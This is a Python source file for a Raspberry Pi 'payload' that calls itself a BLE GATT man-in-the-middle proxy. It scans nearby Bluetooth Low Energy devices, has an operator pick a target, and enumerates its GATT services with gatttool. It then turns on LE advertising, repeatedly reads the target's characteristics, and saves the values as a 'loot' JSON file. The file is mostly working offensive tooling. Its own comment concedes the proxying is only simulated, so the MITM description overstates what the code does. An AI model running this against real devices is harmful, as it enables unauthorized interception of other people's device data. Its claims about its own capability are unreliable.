#!/usr/bin/env python3
# @name: BLE GATT MITM Proxy
# @desc: Scan BLE devices, select a target, connect and enumerate all GATT services/characteristics.
# @category: bluetooth
# @danger: true
# @active: true
# @web: true
"""
RaspyJack Payload -- BLE GATT MITM Proxy
=========================================
Author: 7h30th3r0n3

Scan BLE devices, select a target, connect and enumerate all GATT
services/characteristics.  Set up the Pi as a BLE peripheral advertising
the same services.  When a client connects to the Pi, forward all
read/write/notify operations to the real device, logging all traffic.

Setup / Prerequisites
---------------------
- Bluetooth adapter (hci0)
- apt install bluez
- gatttool, hcitool available
- Optional: second BT adapter for simultaneous client + peripheral

Controls
--------
  python3 ble_mitm.py [target_mac] [duration_seconds]

    target_mac       -- optional BLE MAC address (AA:BB:CC:DD:EE:FF)
                         to target directly. If omitted, a scan runs
                         and you pick a target from a numbered list.
    duration_seconds -- optional, how long to run the proxy (default:
                         run until Ctrl-C)

  If more than one Bluetooth adapter is present, you'll be prompted to
  pick one from a numbered list.

  Ctrl-C    -- stop the proxy, export the GATT log, and print a summary

Loot: $CITYPOP_LOOT/ble_mitm_<timestamp>.json
"""

from payloads._web_input import request_input
import os
import sys
import time
import json
import re
import asyncio
import threading
import subprocess
from datetime import datetime
from pathlib import Path

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

from payloads._iface_helper import list_bt_interfaces

# ── Constants ────────────────────────────────────────────────────────────────
HCI_DEV = None  # set in main() via _select_bt_interface
LOOT_DIR = Path(os.environ.get("CITYPOP_LOOT", "."))

# ── Shared state ─────────────────────────────────────────────────────────────
lock = threading.Lock()
devices = []           # [{addr, name}]
gatt_services = []     # [{uuid, handle, chars: [{uuid, handle, properties}]}]
gatt_log = []          # [{ts, op, handle, data}]
target_addr = ""
target_connected = False
proxy_active = False
client_count = 0
status_msg = "Idle"
_scan_active = False


# ── HCI helpers ──────────────────────────────────────────────────────────────

def _hci_up():
    subprocess.run(["sudo", "systemctl", "stop", "bluetooth"],
                   capture_output=True, timeout=5)
    subprocess.run(["sudo", "hciconfig", HCI_DEV, "down"],
                   capture_output=True, timeout=5)
    subprocess.run(["sudo", "hciconfig", HCI_DEV, "up"],
                   capture_output=True, timeout=5)
    time.sleep(0.3)


def _hci_reset():
    subprocess.run(["sudo", "hciconfig", HCI_DEV, "reset"],
                   capture_output=True, timeout=5)


# ── BLE scan (bleak) ─────────────────────────────────────────────────────────

async def _bleak_scan(timeout=8):
    """Discover BLE devices using bleak (async)."""
    from bleak import BleakScanner
    found = await BleakScanner.discover(timeout=timeout)
    return [
        (d.address.upper(), d.name or "", getattr(d, "rssi", -99))
        for d in found
    ]


def _scan_ble():
    """Scan for BLE devices using bleak."""
    global status_msg, _scan_active

    with lock:
        _scan_active = True
        status_msg = "Scanning BLE..."

    _hci_up()

    try:
        results = asyncio.run(_bleak_scan(8))
        found = {}
        for addr, name, _rssi in results:
            if addr not in found or (name and not found[addr]):
                found[addr] = name

        result = [{"addr": a, "name": n or a[-8:]} for a, n in found.items()]
        with lock:
            devices.clear()
            devices.extend(result)
            status_msg = f"Found {len(result)} BLE devs"
    except Exception as exc:
        with lock:
            status_msg = str(exc)[:20]
    finally:
        with lock:
            _scan_active = False


# ── GATT enumeration ────────────────────────────────────────────────────────

def _enumerate_gatt(addr):
    """Connect to target and enumerate GATT services/characteristics."""
    global gatt_services, status_msg

    with lock:
        status_msg = f"GATT enum {addr[-8:]}"

    services = []

    # Get primary services
    try:
        result = subprocess.run(
            ["sudo", "gatttool", "-b", addr, "--primary"],
            capture_output=True, text=True, timeout=15,
        )
        for line in result.stdout.strip().split("\n"):
            # attr handle = 0x0001, end grp handle = 0x000b uuid: 00001800-...
            match = re.search(
                r"attr handle\s*=\s*(0x[0-9a-fA-F]+).*uuid:\s*(\S+)",
                line, re.IGNORECASE,
            )
            if match:
                services.append({
                    "handle": match.group(1),
                    "uuid": match.group(2),
                    "chars": [],
                })
    except Exception as exc:
        with lock:
            status_msg = f"Enum err: {str(exc)[:14]}"
        return

    # Get characteristics
    try:
        result = subprocess.run(
            ["sudo", "gatttool", "-b", addr, "--characteristics"],
            capture_output=True, text=True, timeout=15,
        )
        for line in result.stdout.strip().split("\n"):
            # handle = 0x0002, char properties = 0x02, char value handle = 0x0003,
            # uuid = 00002a00-...
            match = re.search(
                r"handle\s*=\s*(0x[0-9a-fA-F]+).*properties\s*=\s*(0x[0-9a-fA-F]+)"
                r".*uuid\s*=\s*(\S+)",
                line, re.IGNORECASE,
            )
            if match:
                char_entry = {
                    "handle": match.group(1),
                    "properties": match.group(2),
                    "uuid": match.group(3),
                }
                # Assign to the right service
                if services:
                    services[-1]["chars"].append(char_entry)
    except Exception:
        pass

    with lock:
        gatt_services = list(services)
        status_msg = f"Enum: {len(services)} svcs"


# ── GATT read helper ────────────────────────────────────────────────────────

def _gatt_read(addr, handle):
    """Read a GATT characteristic value."""
    try:
        result = subprocess.run(
            ["sudo", "gatttool", "-b", addr, "--char-read", "-a", handle],
            capture_output=True, text=True, timeout=10,
        )
        # Characteristic value/descriptor: aa bb cc ...
        match = re.search(r":\s*((?:[0-9a-fA-F]{2}\s*)+)", result.stdout)
        if match:
            return match.group(1).strip()
    except Exception:
        pass
    return ""


def _gatt_write(addr, handle, value):
    """Write a value to a GATT characteristic."""
    try:
        subprocess.run(
            ["sudo", "gatttool", "-b", addr, "--char-write-req",
             "-a", handle, "-n", value],
            capture_output=True, text=True, timeout=10,
        )
        return True
    except Exception:
        return False


# ── Proxy thread ─────────────────────────────────────────────────────────────

def _proxy_loop():
    """
    Main MITM proxy loop: advertise as a peripheral, forward operations.
    Uses hcitool for advertising and gatttool for target communication.
    """
    global proxy_active, client_count, status_msg

    with lock:
        addr = target_addr
        svcs = list(gatt_services)

    if not addr or not svcs:
        with lock:
            status_msg = "No target/services"
        return

    with lock:
        proxy_active = True
        status_msg = "Proxy active"

    # Set up advertising with target's name
    try:
        # Enable LE advertising
        subprocess.run(
            ["sudo", "hciconfig", HCI_DEV, "leadv", "0"],
            capture_output=True, timeout=5,
        )
        with lock:
            status_msg = "Advertising..."
    except Exception as exc:
        with lock:
            status_msg = f"Adv err: {str(exc)[:14]}"
            proxy_active = False
        return

    # Monitor loop: periodically read all characteristics from target
    # and log changes (simulated proxy since full GATT server requires
    # more complex setup)
    prev_values = {}

    while True:
        with lock:
            if not proxy_active:
                break

        now_str = datetime.now().strftime("%H:%M:%S")

        for svc in svcs:
            for char in svc.get("chars", []):
                with lock:
                    if not proxy_active:
                        break
                handle = char["handle"]
                props = int(char.get("properties", "0x00"), 16)

                # Only read if readable (bit 1)
                if props & 0x02:
                    val = _gatt_read(addr, handle)
                    if val:
                        key = handle
                        with lock:
                            if key not in prev_values or prev_values[key] != val:
                                prev_values[key] = val
                                gatt_log.append({
                                    "ts": now_str,
                                    "op": "READ",
                                    "handle": handle,
                                    "uuid": char["uuid"][-8:],
                                    "data": val[:20],
                                })
                                client_count = len(gatt_log)

        time.sleep(2)

    # Stop advertising
    try:
        subprocess.run(
            ["sudo", "hciconfig", HCI_DEV, "noleadv"],
            capture_output=True, timeout=5,
        )
    except Exception:
        pass


# ── Start / stop ─────────────────────────────────────────────────────────────

def _connect_target(addr):
    """Connect to target: enumerate GATT then start proxy."""
    global target_addr, target_connected

    _enumerate_gatt(addr)

    with lock:
        target_addr = addr
        target_connected = True

    threading.Thread(target=_proxy_loop, daemon=True).start()


def _stop_proxy():
    global proxy_active, target_connected, status_msg
    with lock:
        proxy_active = False
        target_connected = False
        status_msg = "Proxy stopped"
    time.sleep(0.5)
    _hci_reset()


# ── Export ───────────────────────────────────────────────────────────────────

def _export_log():
    LOOT_DIR.mkdir(parents=True, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    path = LOOT_DIR / f"ble_mitm_{ts}.json"
    with lock:
        data = {
            "timestamp": ts,
            "target": target_addr,
            "services": list(gatt_services),
            "gatt_log": list(gatt_log),
        }
    with open(path, "w") as fh:
        json.dump(data, fh, indent=2)
    return path


# ── Bluetooth adapter selection ─────────────────────────────────────────────

def _select_bt_interface():
    """Detect BT interfaces and pick one. Prompts if more than one is found."""
    ifaces = list_bt_interfaces()

    if not ifaces:
        print("No Bluetooth adapter found.", flush=True)
        return None

    if len(ifaces) == 1:
        chosen = ifaces[0]
        if not chosen["is_up"]:
            subprocess.run(["sudo", "hciconfig", chosen["name"], "up"],
                           capture_output=True, timeout=5)
        return chosen["name"]

    print("Multiple Bluetooth adapters found:", flush=True)
    for i, ifc in enumerate(ifaces):
        mac = ifc["mac"] or "?"
        state = "UP" if ifc["is_up"] else "DOWN"
        print(f"  [{i}] {ifc['name']}  {ifc['bus'] or '?'}  {mac}  {state}", flush=True)

    while True:
        choice = str(request_input("Select Bluetooth adapter", input_type="select", choices=[
            {"value": str(i), "label": f"{item['name']} · {item.get('bus') or 'unknown'} · {item.get('mac') or 'no address'} · {'UP' if item.get('is_up') else 'DOWN'}"}
            for i, item in enumerate(ifaces)]))
        if choice.isdigit() and 0 <= int(choice) < len(ifaces):
            chosen = ifaces[int(choice)]
            if not chosen["is_up"]:
                subprocess.run(["sudo", "hciconfig", chosen["name"], "up"],
                               capture_output=True, timeout=5)
            return chosen["name"]
        print("Invalid selection, try again.", flush=True)


# ── Target selection ─────────────────────────────────────────────────────────

_MAC_RE = re.compile(r"^[0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5}$")


def _select_target():
    """Scan for BLE devices and let the operator pick one by number."""
    print("Scanning for BLE devices...", flush=True)
    _scan_ble()

    with lock:
        devs = list(devices)
        msg = status_msg

    print(msg, flush=True)
    if not devs:
        return None

    for i, dev in enumerate(devs):
        print(f"  [{i}] {dev['addr']}  {dev['name']}", flush=True)

    while True:
        choice = str(request_input("Select Bluetooth target", input_type="select", choices=[
            {"value": str(i), "label": f"{item.get('name') or 'unknown'} · {item.get('addr') or 'no address'}"}
            for i, item in enumerate(devs)]))
        if choice.isdigit() and 0 <= int(choice) < len(devs):
            return devs[int(choice)]["addr"]
        print("Invalid selection, try again.", flush=True)


# ── Main ─────────────────────────────────────────────────────────────────────

def _usage():
    print(f"Usage: {os.path.basename(__file__)} [target_mac] [duration_seconds]", flush=True)
    print("  target_mac        BLE MAC, e.g. AA:BB:CC:DD:EE:FF "
          "(optional; omit to scan and pick a target)", flush=True)
    print("  duration_seconds  how long to run the proxy (default: until Ctrl-C)", flush=True)


def main():
    global status_msg, HCI_DEV

    args = sys.argv[1:]
    if args and args[0] in ("-h", "--help"):
        _usage()
        return 0

    target = None
    if args and _MAC_RE.match(args[0]):
        target = args[0].upper()
        args = args[1:]

    duration = None
    if args:
        try:
            duration = float(args[0])
        except ValueError:
            _usage()
            return 1

    HCI_DEV = _select_bt_interface()
    if not HCI_DEV:
        return 1

    if not target:
        target = _select_target()
        if not target:
            print("No target selected. Exiting.", flush=True)
            return 1

    print(f"Connecting to {target} and enumerating GATT services...", flush=True)
    _connect_target(target)

    with lock:
        svcs = list(gatt_services)

    if not svcs:
        print("No GATT services found. Exiting.", flush=True)
        _stop_proxy()
        return 1

    n_chars = sum(len(s.get("chars", [])) for s in svcs)
    print(f"Found {len(svcs)} services, {n_chars} characteristics. Proxy running.", flush=True)

    if duration:
        print(f"Proxying for {duration:.0f}s ...", flush=True)
    else:
        print("Proxying until Ctrl-C ...", flush=True)

    start_time = time.time()
    last_log_count = 0

    try:
        while True:
            time.sleep(3.0)
            with lock:
                logs = list(gatt_log)
                msg = status_msg

            for entry in logs[last_log_count:]:
                print(f"  {entry['ts']} {entry['op']} handle={entry['handle']} "
                      f"uuid={entry.get('uuid', '')} data={entry.get('data', '')}", flush=True)
            last_log_count = len(logs)

            elapsed = time.time() - start_time
            print(f"[{elapsed:6.1f}s] {msg}  ops={len(logs)}", flush=True)

            if duration and elapsed >= duration:
                break
    except KeyboardInterrupt:
        print("\nStopping proxy...", flush=True)

    finally:
        _stop_proxy()

    path = _export_log()
    with lock:
        n_ops = len(gatt_log)
    print(f"\nSummary: target={target} services={len(svcs)} ops={n_ops}", flush=True)
    print(f"Exported log to {path}", flush=True)

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
